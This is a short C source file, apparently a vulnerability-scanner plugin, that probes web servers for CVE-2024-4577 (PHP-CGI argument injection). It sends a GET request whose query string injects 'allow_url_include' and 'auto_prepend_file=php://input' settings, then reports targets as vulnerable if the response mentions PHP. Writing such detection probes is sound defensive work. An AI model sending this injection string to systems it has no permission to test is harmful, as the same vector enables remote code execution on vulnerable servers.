/* http-vuln-cve2024-4577-4 - PHP CGI argument injection probe. */
#include "arsenal_util.h"

int almap_script_run(AlScriptContext *ctx) {
    char resp[8192];
    int n;

    if (!ar_valid(ctx)) {
        return 1;
    }
    n = ar_http_request(ctx, "GET", "/php-cgi/php-cgi.exe?%add+allow_url_include%3d1+%add+auto_prepend_file%3dphp://input", NULL, NULL, NULL, NULL,
                        resp, sizeof(resp));
    if (n <= 0) {
        ar_out(ctx, "http-vuln-cve2024-4577-4: no HTTP response");
        return 0;
    }
    if (ar_contains_ci(resp, "PHP")) {
        ar_out(ctx, "VULNERABLE: /php-cgi/php-cgi.exe?%add+allow_url_include%3d1+%add+auto_prepend_file%3dphp://input [%d] (CVE-2024-4577)", ar_http_status(resp));
    } else {
        ar_out(ctx, "not vulnerable: CVE-2024-4577 (/php-cgi/php-cgi.exe?%add+allow_url_include%3d1+%add+auto_prepend_file%3dphp://input [%d])", ar_http_status(resp));
    }
    return 0;
}
